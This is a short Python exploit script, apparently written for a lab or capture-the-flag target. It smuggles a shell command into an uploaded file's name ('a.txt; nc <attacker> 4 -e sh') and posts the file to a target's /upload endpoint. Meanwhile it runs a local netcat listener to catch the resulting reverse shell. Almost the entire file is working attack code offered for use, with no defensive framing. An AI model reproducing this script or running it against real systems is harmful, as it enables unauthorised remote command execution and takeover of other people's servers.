#!/usr/bin/env python3
import os, time, string, binascii, socket, sys, subprocess
import requests as r
def banner():
	time.sleep(1)
	print(colors.OKGREEN + """
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
         !.......:!?|||||!!^^""'            ||||
         !.........||||                     ||||
         !.........||||  ##                 ||||
         !.........||||                     ||||
         !.........||||                     ||||
         !.........||||                     ||||
         !.........||||                     ||||
         `.........||||                    ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!
          `..::!8888888888888888888888888888888899fT|!^"'
            `' !!988888888888888888888888899fT|!^"'
                `!!8888888888888888899fT|!^"'
                  `!988888888899fT|!^"'
                    `!9899fT|!^"'
                      `!^"'
                      Written by: manjoos
		""" + colors.END)
	time.sleep(1)
try:
    class colors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKCYAN = '\033[96m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        END = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
	
    lhost = sys.argv[1]
    rhost = sys.argv[2]
    hexed = binascii.hexlify(socket.inet_aton(lhost))
    lhost = str(hexed)
    lhost = "0x" + lhost.strip("b'")	# yes i know this is poorly written..
    payload = "a.txt; nc " + lhost + " 4 -e sh"
	
    banner()
    os.system("echo '\e[5mBombs away..\e[0m'")
    print("\n"+colors.WARNING+colors.BOLD+"Starting Listener"+colors.END)
    subprocess.Popen(["nc","-lvnp","4"])
	
    if os.path.isfile(payload):
        pass
    else:
        with open(payload, "a") as f:
            f.write("nonsensical whimsical wonders of the imagination")
            f.close()
		
    url = str("http://" + rhost + "/upload")
    files = {'file': (payload, open(payload, 'rb'), 'text/plain')}
    bomb = r.post(url, files=files)

except KeyboardInterrupt:
    print(colors.WARNING + "\nCtrl + C Pressed!" + colors.END)
    time.sleep(0.5)
	
except IndexError:
    print( "\n" + colors.WARNING + colors.BOLD + "Usage: python3 %s [lhost] [rhost]" % sys.argv[0] + colors.END + "\n")
